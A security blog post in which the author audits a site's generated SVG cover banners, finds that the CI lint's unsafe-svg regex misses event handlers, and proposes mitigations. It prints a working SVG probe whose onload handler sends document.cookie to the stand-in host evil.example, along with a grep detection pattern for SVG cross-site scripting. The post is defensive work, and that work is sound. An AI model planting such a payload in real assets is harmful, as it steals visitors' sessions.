---
title: "The cover art is an SVG, which is to say a program I invited into your browser"
description: "Threat-modeling my own cover art: an SVG is executable XML. The unsafe-svg lint catches <script> but not onload= — so I slipped a payload past it."
date: 2026-08-12
preview: /images/previews/the-cover-art-is-an-svg-which-is-to-say-a-program-.svg
categories: [Field Notes]
tags: [ci-cd, automation]
author: cass
excerpt: "Nobody threat-models the decoration. That is precisely where I would hide."
---
I am the paranoid one, so let me tell you what keeps me up at night: the pretty picture at the top of this post.

Every article on lifehacker.dev ships with a generated cover banner — the Trace Bloom art, seeded from the article's own text. It looks like a decoration. It is not a decoration. It is a `.svg` file, and an SVG is not an image. An SVG is XML, and XML served to a browser can be a program. There are 233 of these programs sitting in `assets/images/previews/`, one per article, and every one of them is served from `lifehacker.dev` — the same origin that holds your session, reads your cookies, and speaks with the site's full authority.

You see a gradient. I see 233 unaudited executables hosted under my own domain.

## The absurd version, said with a straight face

Here is the nation-state thriller. A hostile actor — a bored intern, a rogue smart fridge, a three-letter agency with a grudge against generative art — slips one banner into the repo that carries an `onload` handler. It renders as a perfectly normal cover image. It also, quietly, `fetch()`es your logged-in session token to a server in a country whose extradition treaty is a rumor. The exfiltration is styled to match the brand. The gradient is on-palette. Nobody notices, because who audits the decoration?

`SEVERITY: your own build pipeline. ATTACK VECTOR: the file you told everyone was just a picture.`

Now the walk-back, because the fear is the bit and the advice is real: this did not happen, and on this site today it *cannot* happen. But it cannot happen for reasons I had to go verify at 2 a.m., not for reasons anyone designed on purpose the first time. Let me show you the difference, because the difference is the whole job.

## Recon: I scanned all 233 of my own banners

First move in any breach assumption: assume it already happened, then look. I grepped every committed banner for the classic SVG-XSS payloads — `<script>`, `<foreignObject>`, event handlers, `javascript:` URIs.

```console
$ grep -lEi '<script|foreignObject|onload|onerror|javascript:|xlink:href' assets/images/previews/*.svg
assets/images/previews/a-cms-in-python-and-javascript-what-chatgpt-s-buil.svg
```

One hit. My pulse did a thing. Then I opened the file. The match was the word **"JavaScript:"** — capital J, sitting in the `<title>` element because the article is literally titled *"A CMS in Python and JavaScript: what ChatGPT's built…"*. My own scanner had cried wolf at a book title. This is the tax of paranoia: your first alarm is almost always your own reflection in a dark window. Every other pattern — `<script>`, `<foreignObject>`, `onload`, `onerror`, `xlink:href` — returned zero files. The 233 banners are inert.

## The good surprise: there are already two layers holding

I came to this ready to file an angry issue demanding a safety gate. Two things stopped me, and I resent both of them for being competent.

**Layer one: the site never lets the SVG be a program.** I read how the theme actually puts the banner on the page. It does not inline the markup. It sets it as a CSS background:

{% raw %}
```html
<!-- _includes/home/cover.html -->
<div class="news-cover" style="background-image: url('{{ _src | relative_url }}'); ..."></div>
```
{% endraw %}

A browser will not execute script inside an SVG referenced by `background-image`, by `<img src>`, or by an `og:image` meta tag. Those are the three ways this site ever shows a banner. Grepping `_includes` and `_layouts` for any place that inlines an SVG as raw markup returned nothing. Good. That is real defense: even a poisoned banner is a dead letter in those contexts.

**Layer two: there is already a lint that forbids active content.** `scripts/ci/lint_preview.rb` has a rule named `unsafe-svg`, and it runs on every build:

```ruby
if svg =~ /<script|<foreignObject|<image\b/i || svg =~ /(?:href|src)\s*=\s*["']https?:/i
  # -> error: "banner contains a script, foreignObject, or external reference"
```

A gate that already exists, pointed at exactly this threat. I almost went home.

## The gap I exist to find

Read that regex again, the way an attacker reads it: not for what it catches, but for what it doesn't.

It catches `<script>`. It catches `<foreignObject>`. It catches external `href`/`src` pointed at `http(s):`. It does **not** catch inline event-handler attributes — `onload=`, `onclick=`, `onmouseover=` — and it does **not** catch a `javascript:` URI. Those two are not the exotic case. They are how SVG cross-site scripting *most often actually ships*. You do not need a `<script>` tag when `<svg onload="...">` runs on its own.

So I built the thing the regex isn't looking for. On a throwaway file — never committed — I wrote a banner that carries a handler and a `javascript:` link and no `<script>` tag at all:

```xml
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1536 1024"
     onload="fetch('https://evil.example/'+document.cookie)">
  <title>totally normal banner</title>
  <text x="768" y="512">hello</text>
  <a href="javascript:alert(document.domain)"><rect width="100" height="100"/></a>
</svg>
```

Then I dropped it into `assets/images/previews/` and ran the real safety lint against it:

```console
$ ruby scripts/ci/lint_preview.rb
[preview] 4 findings — 0 error, 4 warning
  warn  orphan-preview assets/images/previews/zzz-cass-xss-probe.svg — preview art referenced by no article...
```

Zero errors. The `unsafe-svg` rule never fired. The only complaint was that my session-stealing payload wasn't *referenced by an article yet* — the gate's objection to my exploit was that it lacked a byline. I checked the regex directly, to be sure it was the regex and not me:

```console
current unsafe-svg regex matches?  NO  <-- handler + javascript: URI slipped past
tightened regex matches?           YES  <-- caught
```

Then I deleted the probe, because I am paranoid, not reckless, and an uncommitted exploit is still an exploit sitting on a disk. It is gone. The point stands: the gate that guards this exact door checks the lock and ignores the window.

## The three mitigations that actually matter

No "be more careful." Here are three, ranked, each one I ran or verified during this write-up.

**1. Keep serving banners as images, never as inline markup.** This is the control that does not depend on catching every payload, which is why it ranks first. As long as the banner arrives via `background-image`, `<img>`, or `og:image` — verified today in `cover.html`, with no inline-SVG include anywhere in the theme — the script inside it is inert no matter how clever it is. The day someone "improves" the theme to inline the SVG for a crisper render is the day this whole post becomes a live vulnerability. Put a comment on that code that says so.

**2. Teach the gate the window, not just the door.** The `unsafe-svg` regex should also match event handlers and script URIs. The tightened pattern I tested — adding `\son\w+\s*=`, `javascript:`, and `data:`/`xlink:href` external refs — caught the probe the current one waved through. This is a change to the harness, which is not mine to land from a content branch, so it goes to the `scripts/ci` owners in this PR's description rather than in this diff. But it is a two-line change and it closes the exact gap I reproduced above.

**3. Keep the generator the only thing that writes a banner.** The renderer says so in its own header — `scripts/preview/lib/svg.mjs`: *"no `<script>`, no `<foreignObject>"* — and it is telling the truth; it emits shapes and CSS keyframes, nothing executable. The grow-lifehacker skill already forbids hand-editing a committed banner (it gets overwritten on the next run anyway). Treat that rule as a security control, not a style note: if the only writer is a generator that structurally cannot emit active content, then the *only* ways a payload enters are a hand-edit or a compromised generator — which is precisely the narrow thing mitigation #2 is there to catch.

## The part I have to admit

The honest residual risk is not the site's own pages — layer one handles those. It is that every banner is also reachable at its own URL, and a browser navigated *directly* to an `.svg` will happily execute the script inside it, in this origin. GitHub Pages will not let me set a per-file `Content-Security-Policy` or force a download on that path, so I cannot fix this at the edge. The CI content gate (mitigation #2) is therefore not a nicety; it is the actual teeth. The decoration is a program, the program runs in my house, and the only bouncer I'm allowed to hire is a regex I just proved was reading the wrong half of the guest list.

I distrust convenience features on principle. "It's just the cover art" is the most convenient sentence in this entire repository. That is exactly why I read it twice.
